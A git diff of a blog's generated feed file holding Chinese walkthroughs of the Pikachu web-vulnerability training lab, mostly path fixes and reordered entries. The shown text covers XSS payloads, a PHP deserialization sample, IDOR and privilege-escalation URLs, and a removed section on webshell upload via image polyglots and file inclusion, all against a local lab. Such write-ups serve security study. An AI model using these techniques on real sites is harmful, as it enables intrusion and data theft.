@@ -9,7 +9,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">姓名:vince</span><br><span class="line">性别:boy</span><br><span class="line">手机:<span class="number">18626545453</span></span><br><span class="line">住址:chain</span><br><span class="line">邮箱:vince@pikachu.com</span><br></pre></td></tr></table></figure>
 
 <p><img src="/../../img/docs/pikachu/CSRF/1738227135473-867932c7-ce88-4729-bbac-e290b62a7b19.png"></p>
-<p>将邮箱修改成 <a href="mailto:&#109;&#x6f;&#x76;&#64;&#112;&#105;&#107;&#x61;&#99;&#x68;&#x75;&#46;&#x63;&#111;&#x6d;">mov@pikachu.com</a> 了。</p>
+<p>将邮箱修改成 <a href="mailto:&#x6d;&#111;&#x76;&#x40;&#x70;&#x69;&#x6b;&#x61;&#x63;&#104;&#x75;&#46;&#x63;&#x6f;&#109;">mov@pikachu.com</a> 了。</p>
 <p>不过没看到它在 URL 有显示 GET 获取的数据罢了。</p>
 <p>我们看一下浏览器中表单中各个组件的 name 值</p>
 <p><img src="/../../img/docs/pikachu/CSRF/1738241890213-eb70ddd3-a33a-41a8-bd61-bb3ab34ee2dd.png"></p>
@@ -67,13 +67,13 @@
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <p>输入进去，我们可以看到，前端限制了长度</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738115493543-f811ab67-e8fd-4a17-9351-274a87084f7e.png)</p>
+<p><img src="/../../img/docs/pikachu/Croos-Site_Scripting/1738115493543-f811ab67-e8fd-4a17-9351-274a87084f7e.png"></p>
 <p>这个简单，这种就是用了 HTML 的语法限制。我们浏览器调试一下。把 maxlength 改成 100 甚至更大。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738115566615-70db18d3-bf0b-40b6-9c2f-f0fc37af980d.png)</p>
+<p><img src="/../../img/docs/pikachu/Croos-Site_Scripting/1738115566615-70db18d3-bf0b-40b6-9c2f-f0fc37af980d.png"></p>
 <p>解决</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738115609972-2894658c-07c4-4a89-910d-2e61293bc95b.png)</p>
+<p><img src="/../../img/docs/pikachu/Croos-Site_Scripting/1738115609972-2894658c-07c4-4a89-910d-2e61293bc95b.png"></p>
 <p>这个题目有一个 GET，就是通过 URL 进行传输信息。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738115661840-64b8c2a5-b075-4fac-b73a-41f33808ac7e.png)</p>
+<p><img src="/../../img/docs/pikachu/Croos-Site_Scripting/1738115661840-64b8c2a5-b075-4fac-b73a-41f33808ac7e.png"></p>
 <p>说明我们不仅可以通过修改 HTML 语法进行绕过，还可以通过修改 URL 进行绕过。</p>
 <p><strong>方法</strong></p>
 <ol>
@@ -86,9 +86,9 @@
 <p>ok 可以。</p>
 <p>并且每次刷新也不会消失。</p>
 <h1 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h1><p>可以看到，这次简单输入 js 代码不行了。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738116717155-c0753f89-9fbf-45f4-82b6-51ec297be670.png)</p>
+<p><img src="/../../img/docs/pikachu/Croos-Site_Scripting/1738116717155-c0753f89-9fbf-45f4-82b6-51ec297be670.png"></p>
 <p>我们通过浏览器调试查看一下代码。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738116781991-38f768d0-cc5a-4804-b13c-524827fb5671.png)</p>
+<p><img src="/../../img/docs/pikachu/Croos-Site_Scripting/1738116781991-38f768d0-cc5a-4804-b13c-524827fb5671.png"></p>
 <p>可以看到有一个 id 为 dom 的 div 框，里面将输入框里的文字放到了 href 里，就成了超链接。</p>
 <p><strong>解决办法</strong></p>
 <p>我们可以将 href 进行封闭，我们想要的的是：</p>
@@ -105,7 +105,7 @@
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;</span></span><br></pre></td></tr></table></figure>
 
 <p>看一下浏览器解析的，也没错，怎么没有弹窗？</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738118925608-ce04428f-cede-4581-82ee-30d7f03b4861.png)</p>
+<p><img src="/../../img/docs/pikachu/Croos-Site_Scripting/1738118925608-ce04428f-cede-4581-82ee-30d7f03b4861.png"></p>
 <p>当我们点击按钮时，发现我们的浏览器并没有刷新，自然 js 代码也不会被执行。</p>
 <p><strong>成功案例</strong></p>
 <p>我们需要写一些可以手动激活 alert 的 HTML 代码。比如 onlick 或者鼠标操作。</p>
@@ -118,8 +118,8 @@
 <p>这个通过 GET 请求到 URL 上，然后通过 javascript 获取 URL 的 text 数据，最后放在超连接中。</p>
 <h1 id="XSS-之盲打"><a href="#XSS-之盲打" class="headerlink" title="XSS 之盲打"></a>XSS 之盲打</h1><p>我们这次通过输入普通字符和一般的 js 代码都不会输出字符或者跳出弹窗。浏览器调用发现表单是 POST 请求的，没啥信息。看看提示，有一个后端。</p>
 <p>进入，之后就有弹窗了。空白处就是弹窗的字符。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738120952175-91bed87b-ee45-410b-8951-45cf8c298ab3.png)</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738120993607-967c3cbc-a299-435f-8027-42fad0568325.png)</p>
+<p><img src="/../../img/docs/pikachu/Croos-Site_Scripting/1738120952175-91bed87b-ee45-410b-8951-45cf8c298ab3.png"></p>
+<p><img src="/../../img/docs/pikachu/Croos-Site_Scripting/1738120993607-967c3cbc-a299-435f-8027-42fad0568325.png"></p>
 <p>**原理：**通过 POST 请求保存在服务器上，可以在工作人员打开后端时执行 xss 代码。</p>
 <h1 id="XSS-之过滤"><a href="#XSS-之过滤" class="headerlink" title="XSS 之过滤"></a>XSS 之过滤</h1><p>输入 1 是这样的</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">别说这些<span class="string">&#x27;1&#x27;</span>的话,不要怕,就是干!</span><br></pre></td></tr></table></figure>
@@ -168,39 +168,9 @@
 
 <h1 id="XSS-之-js-输出"><a href="#XSS-之-js-输出" class="headerlink" title="XSS 之 js 输出"></a>XSS 之 js 输出</h1><p>JS 同样可以和 HTML 一样从字符串中进行语法闭合。PHP、MySQL 也有时一样。</p>
 <p>构造的入手点</p>
-<p>![](../../img/docs/pikachu/Croos-Site Scripting/1738131404805-fe8bab00-bdd1-4b97-90ef-f1a4267f3b65.png)</p>
+<p><img src="/../../img/docs/pikachu/Croos-Site_Scripting/1738131404805-fe8bab00-bdd1-4b97-90ef-f1a4267f3b65.png"></p>
 <p>将<script>进行闭合，在构造自己的事件。</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>网安</category>
-        <category>靶场</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>网安</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Over Permisson</title>
-    <url>/posts/687.html</url>
-    <content><![CDATA[<h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><p>我们输入 kobe 的账号密码，进入进去，查看个人资料，我们发现 URL 上面的信息，我们可以尝试改成其他用户名(lucy&#x2F;lili&#x2F;kobe)</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%<span class="number">82</span>%B9%E5%<span class="number">87</span>%BB%E6%<span class="number">9</span>F%A5%E7%<span class="number">9</span>C%<span class="number">8</span>B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%<span class="number">81</span>%AF</span><br></pre></td></tr></table></figure>
-
-<p>发现改成 lucy 的，在 kobe 页面也可以看到 lucy 的个人信息，这就是水平越权漏洞了。同样的可以看到 lili 的信息。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Over Permisson&#x2F;1738553620437-17c0ab66-0230-4549-a5eb-478576d1e285.png)</p>
-<h1 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h1><p>提供了 admin&#x2F;123456、pikachu&#x2F;000000，还说明了 admin 是超级用户，我们登录 admin 账号试试。同样的我们发现了添加用户和删除用户的 URL，我们就登录看 pikachu 这个账户看能不能利用即可。</p>
-<p>添加用户的 URL</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure>
-
-<p>删除用户的 URL 之一</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin.php?id=<span class="number">6</span></span><br></pre></td></tr></table></figure>
-
-<p>发现添加用户的 URL 在 pikachu 中可以进去。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Over Permisson&#x2F;1738554015974-aad2bdd0-7499-473b-9e7d-6f206391ce35.png)</p>
-<p>我们通过 admin 可以看到 hhh 的 id 为 28。我们再切换到 pikachu 去删除它，发现 pikachu 没有删除的权限。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin.php?id=<span class="number">28</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -276,6 +246,36 @@
 <p><img src="/../../img/docs/pikachu/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1738632342371-4ea7e487-6a91-497a-8589-2f54ccbd12a1.png"></p>
 <h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>很明显，这里代码根本就没给类 S 实例化，所以也就没用到魔法函数，只是下面的判断语句起了用途，并且不是我想的 需要第二个，还是变量名称腰围 test 就可以了，笑。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Over Permisson</title>
+    <url>/posts/687.html</url>
+    <content><![CDATA[<h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><p>我们输入 kobe 的账号密码，进入进去，查看个人资料，我们发现 URL 上面的信息，我们可以尝试改成其他用户名(lucy&#x2F;lili&#x2F;kobe)</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%<span class="number">82</span>%B9%E5%<span class="number">87</span>%BB%E6%<span class="number">9</span>F%A5%E7%<span class="number">9</span>C%<span class="number">8</span>B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%<span class="number">81</span>%AF</span><br></pre></td></tr></table></figure>
+
+<p>发现改成 lucy 的，在 kobe 页面也可以看到 lucy 的个人信息，这就是水平越权漏洞了。同样的可以看到 lili 的信息。</p>
+<p><img src="/../../img/docs/pikachu/Over_Permisson/1738553620437-17c0ab66-0230-4549-a5eb-478576d1e285.png"></p>
+<h1 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h1><p>提供了 admin&#x2F;123456、pikachu&#x2F;000000，还说明了 admin 是超级用户，我们登录 admin 账号试试。同样的我们发现了添加用户和删除用户的 URL，我们就登录看 pikachu 这个账户看能不能利用即可。</p>
+<p>添加用户的 URL</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure>
+
+<p>删除用户的 URL 之一</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin.php?id=<span class="number">6</span></span><br></pre></td></tr></table></figure>
+
+<p>发现添加用户的 URL 在 pikachu 中可以进去。</p>
+<p><img src="/../../img/docs/pikachu/Over_Permisson/1738554015974-aad2bdd0-7499-473b-9e7d-6f206391ce35.png"></p>
+<p>我们通过 admin 可以看到 hhh 的 id 为 28。我们再切换到 pikachu 去删除它，发现 pikachu 没有删除的权限。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin.php?id=<span class="number">28</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -625,173 +625,6 @@
       </tags>
   </entry>
   <entry>
-    <title>URL重定向</title>
-    <url>/posts/60126.html</url>
-    <content><![CDATA[<p><strong>不安全的 URL 跳转</strong></p>
-<p>很容易发现超链接用一个 url 进行 GET 传参，我们进行构造</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/urlredirect/urlredirect.php?url=https:<span class="comment">//www.baidu.com</span></span><br></pre></td></tr></table></figure>
-
-<p>发现，很容易就进入了百度的页面。</p>
-<p>并且当我们输入..&#x2F;的时候，就一个目录吧，也会出现铭感信息泄露的问题（可能是这个靶场本来就没有做，笑）</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/urlredirect/urlredirect.php?url=../</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>网安</category>
-        <category>靶场</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>网安</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Unsafe Fileupload</title>
-    <url>/posts/55331.html</url>
-    <content><![CDATA[<p>不安全的文件上传</p>
-<h1 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h1><p><strong>客户端检测</strong></p>
-<p>他说这里只允许上传图片，我们就看看这里的 HTML 语句，发现有一个 JS 代码限制了文件的类型。我们可以常识一下禁止 JS 代码或者修改 JS 代码。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFileExt</span>(<span class="params">filename</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="literal">false</span>; <span class="comment">//状态</span></span><br><span class="line">  <span class="keyword">var</span> arr = [<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;gif&quot;</span>];</span><br><span class="line">  <span class="comment">//取出上传文件的扩展名</span></span><br><span class="line">  <span class="keyword">var</span> index = filename.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> ext = filename.<span class="title function_">substr</span>(index+<span class="number">1</span>);</span><br><span class="line">  <span class="comment">//比较</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.<span class="property">length</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(ext == arr[i])</span><br><span class="line">      &#123;</span><br><span class="line">        flag = <span class="literal">true</span>; <span class="comment">//一旦找到合适的，立即退出循环</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//条件判断</span></span><br><span class="line">  <span class="keyword">if</span>(!flag)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;上传的文件不符合要求，请重新选择！&quot;</span>);</span><br><span class="line">    location.<span class="title function_">reload</span>(<span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>我们采用了禁止 JS 代码运行，我直接上传了一句话木马，网页直接给我了相对位置了。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">uploads/hack.<span class="property">php</span></span><br></pre></td></tr></table></figure>
-
-<p>然后用蚁剑去利用。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738549392898-996977a9-c72b-40ee-ac13-a431ff0347de.png)</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738549418881-2f414217-a66d-42de-b33a-03c057ffba9d.png)</p>
-<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p><strong>MIME</strong> 是描述消息内容类型的标准。</p>
-<p><a href="https://www.runoob.com/http/mime-types.html">https://www.runoob.com/http/mime-types.html</a></p>
-<p>**MIME **类型通用结构</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">type/subtype</span><br></pre></td></tr></table></figure>
-
-<p>这里我们查看浏览器，为 POST 请求，还有一个multipart&#x2F;form-data 是指定传输数据为二进制类型。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738549827916-c8398f53-d1b0-4aea-8149-77764ec12dda.png)</p>
-<p>我们尝试一下抓包，内容如下</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;uploadfile&quot;</span>; filename=<span class="string">&quot;hack.png&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/octet-stream</span><br></pre></td></tr></table></figure>
-
-<p>看到类型为 applicaiton&#x2F;octet-stream 我们可以改成image&#x2F;png 或者其他图片类型看看。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738550444506-3f0ce96a-23f5-462e-9858-ec19dd76e650.png)</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738550462080-4f4d36ad-ac49-4019-89c0-5a529eaa3059.png)</p>
-<p>可以上传成功，我们用蚁剑去验证。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738550605915-9e95c319-40ad-4a6c-be0a-f4e45328297f.png)</p>
-<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h1><p>getimagesize 获取图片大小（用于看到底是不是图片的一个函数）</p>
-<p>我们看 DOS 命令中的 copy</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">COPY</span> [/<span class="type">D</span>] [/<span class="type">V</span>] [/<span class="type">N</span>] [/<span class="type">Y</span> | /-<span class="type">Y</span>] [/<span class="type">Z</span>] [/<span class="type">L</span>] [/<span class="type">A</span> | /<span class="type">B</span> ] source [/<span class="type">A</span> | /<span class="type">B</span>]</span><br><span class="line">     [+ <span class="type">source</span> [/<span class="type">A</span> | /<span class="type">B</span>] [+ <span class="type">...</span>]] [<span class="type">destination</span> [/<span class="type">A</span> | /<span class="type">B</span>]]</span><br><span class="line"></span><br><span class="line">  source       指定要复制的文件。</span><br><span class="line">  /A           表示一个 ASCII 文本文件。</span><br><span class="line">  /B           表示一个二进位文件。</span><br><span class="line">  /D           允许解密要创建的目标文件</span><br><span class="line">  destination  为新文件指定目录和/或文件名。</span><br><span class="line">  /V           验证新文件写入是否正确。</span><br><span class="line">  /N           复制带有非 <span class="number">8</span>dot3 名称的文件时，</span><br><span class="line">               尽可能使用短文件名。</span><br><span class="line">  /Y           不使用确认是否要覆盖现有目标文件</span><br><span class="line">               的提示。</span><br><span class="line">  /<span class="literal">-Y</span>          使用确认是否要覆盖现有目标文件</span><br><span class="line">               的提示。</span><br><span class="line">  /Z           用可重新启动模式复制已联网的文件。</span><br><span class="line">/L           如果源是符号链接，请将链接复制</span><br><span class="line">               到目标而不是源链接指向的实际文件。</span><br><span class="line"></span><br><span class="line">命令行开关 /Y 可以在 COPYCMD 环境变量中预先设定。</span><br><span class="line">这可能会被命令行上的 /<span class="literal">-Y</span> 替代。除非 <span class="built_in">COPY</span></span><br><span class="line">命令是在一个批处理脚本中执行的，默认值应为</span><br><span class="line">在覆盖时进行提示。</span><br><span class="line"></span><br><span class="line">要附加文件，请为目标指定一个文件，为源指定</span><br><span class="line">数个文件(用通配符或 file1+file2+file3 格式)。</span><br></pre></td></tr></table></figure>
-
-<p>copy 中的加号是用于将多个文件合并成一个文件的意思。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> /b hack.php+<span class="number">2</span>.jpg hack.jpg</span><br></pre></td></tr></table></figure>
-
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738551337714-2852671a-667c-40ad-b550-593e0e01fd0d.png)</p>
-<p>发现图片大了</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738551380903-ddc2d3b4-2a51-4737-8ce6-25ad0daebe4d.png)</p>
-<p><strong>解决方法</strong></p>
-<ol>
-<li><strong>修改 php.ini 文件</strong></li>
-<li><strong>上传小图片</strong></li>
-</ol>
-<p>我这里尝试一下修改 php.ini 文件</p>
-<p>查看 php.ini 位置，我们到 RCE 那章的 exec “eval”那节输入 phpinfo();</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738551687865-c3ccc0e7-8327-44fb-8352-28bd47aad4cc.png)</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/etc/php/<span class="number">7.3</span>/apacha2/php.ini</span><br></pre></td></tr></table></figure>
-
-<p>我们进入 pikachu Docker 容器</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">docker exec <span class="literal">-it</span> [容器<span class="type">ID</span>] /bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>我们通过 cd 找到文件，然后输入 vim php.ini，按下 i 编辑，去编辑，随便修改一下大小，最后按下 esc，再输入:wq，OK!</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552023012-9af8d68b-8010-401a-9c42-00e1b0da2672.png)</p>
-<p>哈哈，终于可以上传图片了，不过还是失败了，这是咋回事？</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552487267-b867d845-640d-4f94-b0e0-66607143d41c.png)</p>
-<p>我们用 010Editor 或者 winexe 查看文件的二进制和 16 禁止还有 ASCII 码看看。发现我们的 php 代码在前面，明显我们的 DOS 命令的顺序错误了，我们修改一下</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552548273-48cd6434-d9c6-48eb-9ed9-25962a10b3b1.png)</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> /b <span class="number">2</span>.jpg+ack.php hack.jpg</span><br></pre></td></tr></table></figure>
-
-<p>我们再次上传，我们发现应该是后端 getimagesize 设定是 512kb 的图片，又双叒叕踩坑了。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552701466-9de2af0b-5ab1-420c-8211-6b4415452082.png)</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552814587-0fe7cae6-728d-44bf-a14f-7021497f9fde.png)</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552838685-b58c3555-cbd7-418b-a382-6c4c1a8b3ae8.png)</p>
-<p>我可以放到蚁剑去检验，发现没用，因为它被后端框架被识别是图片，只会展示出来，我们需要用上之前节的文件包含，才会被识别为 php 代码。因为 Include 即使有报错也会往下运行，所以非常欧克。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/fileinclude/fi_local.php?filename=file2.php&amp;submit=%E6%<span class="number">8</span>F%<span class="number">90</span>%E4%BA%A4%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li></li>
-</ul>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">unsafeupload/uploads/<span class="number">2025</span>/<span class="number">02</span>/<span class="number">03</span>/<span class="number">72956067</span>a035f759000198096914.png</span><br></pre></td></tr></table></figure>
-
-<p>&#x3D;</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/<span class="number">2025</span>/<span class="number">02</span>/<span class="number">03</span>/<span class="number">72956067</span>a035f759000198096914.png&amp;submit=%E6%<span class="number">8</span>F%<span class="number">90</span>%E4%BA%A4%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
-
-<p>完美！</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738553350413-a2f51e0a-82ae-4f3f-adab-7e92fda73ce2.png)</p>
-]]></content>
-      <categories>
-        <category>网安</category>
-        <category>靶场</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>网安</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XXE</title>
-    <url>/posts/57467.html</url>
-    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>XXE - “<strong>xml external entity injection</strong>“，”xml 外部实体注入漏洞”。</p>
-<p>XML 指的是可拓展标记语言(extensible markup language)</p>
-<p>菜鸟教程：<a href="about:blank">https://www.runoob.com/xml/xml-tutorial.html</a></p>
-<p>XML 从入门到深入：<a href="https://www.cnblogs.com/antLaddie/p/14823874.html">https://www.cnblogs.com/antLaddie/p/14823874.html</a></p>
-<p><strong>XML 声明</strong></p>
-<p>必须在第一行，参数有 version, encoding, standalone</p>
